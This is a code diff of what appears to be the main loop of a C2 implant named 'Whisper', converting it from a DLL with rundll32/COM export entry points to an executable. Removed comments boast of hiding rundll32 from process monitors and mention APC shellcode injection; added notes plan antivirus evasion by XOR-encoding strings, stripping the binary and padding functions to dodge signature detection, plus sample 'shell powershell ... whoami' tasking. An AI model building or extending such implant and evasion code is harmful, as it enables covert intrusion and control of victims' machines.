@@ -1,3 +1,4 @@
+// core, simple with basic control flow.
 #include "comms_http.h"
 #include "type_conversions.h"
 #include "whisper_commands.h"
@@ -5,79 +6,45 @@
 #include "whisper_json.h"
 #include "whisper_winapi.h"
 #include "whisper_dynamic_config.h"
-#include <windows.h>
-#include <stdio.h>
-#include <stdint.h>
 #include <time.h>
-// Function prototype
-DWORD WINAPI BeaconLoop();
-DWORD WINAPI execute_async(char * agent_id);
+#include <stdint.h>
+#include <stdio.h>
+#include <windows.h> // < might be hodling some defs that we need to dynamically call... deal with later
+// #include <unistd.h>  // For sleep(), use windows.h for sleep, or a custom one
+/*
+RE Notes:
+ - Going to need to XOR strings
+ - Strip Binary as well
+ - Note, the Whisper functions might match signatures of known windows funcs -
+so that could be a detection. maybe add a BS argument to each one to bypass
+this? either at front or back.
 
-// Standard Exported Functions
+*/
 
-//note: The thread allows for the functions to detach/return okay, makes it more normal + cleaner
-//this also seems to hide rundll32 from showing up in processhacker. cewl
+// int execute();
+DWORD execute_async(char * agent_id);
+void generate_uuid4(char* agent_id);
 
-//other ideas: Queue APC call to start if doing shellcode
+// ASYNC BEACON!!!
+/*
+Just starts a thread and lets it run each time, incase it fails or is long
+running, it'll send a message back when it's done/ready.
 
-//COM
-__declspec(dllexport) HRESULT DllRegisterServer() {
-    MessageBox(NULL, "Executed via DllRegisterServer!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-    return S_OK;
-}
-//COM
-__declspec(dllexport) HRESULT DllUnregisterServer() {
-    MessageBox(NULL, "Executed via DllUnregisterServer!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-    return S_OK;
-}
+test with this:
 
+shell powershell -c "Start-Sleep -Seconds 120; whoami"
 
- 
-// Other options
-__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    MessageBox(NULL, "Executed via Run!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-}
-// Other options
-__declspec(dllexport) void Start() {
-    MessageBox(NULL, "Executed via Start!", "DLL Execution", MB_OK);
-    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
-    //if (thread) CloseHandle(thread);
-    BeaconLoop();
-}
+shell echo "TEST"
+
+The echo test will come back first, then the powershell command will do it's
+thing, and show up when done.
+
+This is reflected in the command API call, and in the web gui.
 
 
-// Global flag for thread control
-//volatile BOOL keepRunning = TRUE;
+*/
 
-// Entry point for the DLL
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
-    switch (fdwReason) {
-    case DLL_PROCESS_ATTACH:
-        DEBUG_LOG("[DLL] Loaded into process\n");
-        break;
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-        break;
-    case DLL_PROCESS_DETACH:
-        DEBUG_LOG("[DLL] Unloaded from process\n");
-        //keepRunning = FALSE;
-        break;
-    }
-    return TRUE;
-}
-
-
-// Main beacon loop (runs in a separate thread)
-DWORD WINAPI BeaconLoop() 
+int main()
 {
     DEBUG_LOG("STARTING");
 
@@ -100,7 +67,7 @@ DWORD WINAPI BeaconLoop()
     }
 }
 
-// Thread function for executing commands asynchronously
+// Thread function for executing the command asynchronously
 DWORD WINAPI execute_async(char * agent_id)
 {
 
